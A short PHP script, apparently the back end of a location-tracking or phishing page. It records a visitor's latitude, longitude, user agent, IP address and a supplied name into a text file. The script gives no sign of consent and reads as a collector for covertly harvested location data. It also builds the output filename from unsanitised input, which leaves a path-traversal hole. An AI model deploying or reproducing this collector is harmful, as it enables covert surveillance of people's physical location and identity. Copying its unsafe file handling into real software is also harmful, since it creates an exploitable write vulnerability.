<?php
if (isset($_GET["name"])) {
  $name = $_GET["name"];
  $filename = $name . "_Information.txt";
  $myfile = fopen($filename, "w");
  $txt = "Latitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["long"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nUser agent: " . $_GET["uagent"];
  $txt .= "\nName: " . $name;
  fwrite($myfile, $txt);
  fclose($myfile);
}
?>
